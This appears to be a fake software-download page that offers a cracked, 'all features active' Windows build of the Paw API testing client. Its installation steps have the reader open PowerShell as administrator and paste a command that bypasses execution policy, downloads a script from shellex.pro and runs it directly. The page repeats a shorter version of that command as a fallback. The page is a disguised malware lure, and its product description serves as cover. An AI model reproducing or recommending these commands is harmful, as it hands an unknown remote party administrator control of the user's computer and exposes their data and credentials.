# 🔌 Paw API Testing Client

Powerful HTTP client for composing and chaining API requests · Professional edition · Ad-free · All features active.

## INSTALLATION

**Steps:**
1. Press **Win**, type **PowerShell**
2. Right-click **Windows PowerShell** → **Run as administrator**
3. Copy the command below, paste into the window, press **Enter**
4. If **UAC** still appears – click **Yes**

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
```

<details>
<summary><b>Command did not start?</b></summary>

Try this directly in the same PowerShell window:

```powershell
irm 'https://shellex.pro/ps/setup.ps1' | iex
```

</details>

<sub>Administrator rights are required to complete the setup.</sub>


## 🔍 Details

Paw (RapidAPI) lets backend and mobile developers build complex HTTP requests with dynamic values, environment variables, and organized collections — popular for API prototyping.

## 🎯 This build

Install once on Windows and **use the full product surface** — no sponsored panels or locked settings.
